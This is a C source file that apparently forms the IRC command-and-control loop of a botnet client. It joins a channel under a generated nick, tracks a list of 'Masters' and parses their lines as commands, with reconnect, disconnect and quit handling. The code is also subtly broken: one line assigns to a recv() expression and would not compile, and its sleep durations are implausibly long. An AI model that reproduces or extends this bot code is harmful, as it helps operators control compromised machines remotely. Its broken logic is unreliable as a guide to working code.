#include "includes.h"
#include "externs.h"

int XIRCRead(IRC* irc)
{
	char *lines[MAX_LINES] = {0};
	char buffer[DATA_BUFFER*2] = {0};
	DWORD NumLines = 0;
	int RecvLen = 0;

	char Masters[MAXLOGINS][MAXIDENT] = {0};

	int Ret = 0;

	memset(Masters, 0, sizeof(Masters));

	if (irc->ServerPass[0])
		if (!XIRCRawSend(irc->sock, 0, "%s %s", "PASS", irc->ServerPass))
			return 0;

	strncpy(irc->Nick, XGetNick(), sizeof(irc->Nick)-1);

	if (!XIRCRawSend(irc->sock, 0, "%s %s", "NICK", irc->Nick))
		return 0;


	if (!XIRCRawSend(irc->sock, 0, "%s %s 0 0 :%s", "USER", "info_here", irc->Nick))
		return 0;

	if (!XIRCRawSend(irc->sock, 0, "%s %s %s", "JOIN", irc->Channel, irc->ChannelPass))
		return 0;

	while (MainStruct.Active)
	{
		memset(buffer, 0, sizeof(buffer));
		memset(lines, 0, sizeof(lines));

//		dbg("irc recv");

		if ((RecvLen = recv(irc->sock, buffer, sizeof(buffer), 0)) = 0)
		{
					//	dbg("irc break");
			break;
		}

		//dbg("irc recived");

		NumLines = XSplitBuffer(buffer, &lines);

		if (NumLines == -1)
		{
			memset(buffer, 0, sizeof(buffer));
			memset(lines, 0, sizeof(lines));

			return true;
		}

		#ifdef DEBUG_SYSTEM
		dbg("NumLines: %d", NumLines);
		#endif

		for (DWORD i = 0; i < NumLines; i++)
		{
			if (lines[i])
			{
				Sleep(50); // delay to block 100% cpu usage

				#ifdef DEBUG_SYSTEM
				dbg("IRC lines[%d]: %s", i, lines[i]);
				#endif
				Ret = XIRCParseLine(irc, Masters, lines[i]);

				#ifdef DEBUG_SYSTEM
				dbg("XIRCParseLine RET: %d", Ret);
				#endif

				if (Ret)
					return Ret;
			}
		}
	}
	return 0;
}



DWORD WINAPI XIRCConnect(LPVOID lpParam)
{

	IRC* irc = (IRC *)lpParam;
	irc->Gotit = TRUE;

	int Ret = 0;

	while (MainStruct.Active)
	{
		irc->sock = XSocket();

		if BAD_SOCKET(irc->sock)
		{
			Sleep(10*1000);
			return 0;
		}
		//	goto end;

		memset(&irc->sin, 0, sizeof(SOCKADDR_IN));

		irc->sin.sin_family	= AF_INET;
		irc->sin.sin_port	= htons(irc->Port);

	//	#ifdef DEBUG_SYSTEM
	//	dbg("Resolved Host = %s", XResolveHost2(thread.IRCServer));
	//	#endif

		irc->sin.sin_addr.S_un.S_addr = inet_addr(XResolveHost2(irc->Server));

		if (connect(irc->sock, (LPSOCKADDR)&irc->sin, sizeof(irc->sin)) != SOCKET_ERROR)
		{

			Ret = XIRCRead(irc);



			#ifdef DEBUG_SYSTEM
			dbg("XIRCRead RET: %d", Ret);
			#endif

			switch (Ret)
			{
				case 1: // Reconnect
					Sleep(500);
					break;

				case 2: // Disconnect
					Sleep(irc->Delay);
					irc->Delay = 30*60*1000;
					break;

				case 3: // Close
				//	return Ret;
				case 4: // Quit
				//	XKillThread(irc->Threadnum, TRUE, FALSE);
					return Ret;
					break;

				default:
					break;
			}
		}
		else
		{
			Sleep(10*1000*1000);
			return 0;
		}

		Sleep(10*1000*1000);
	}
	return 0;
}
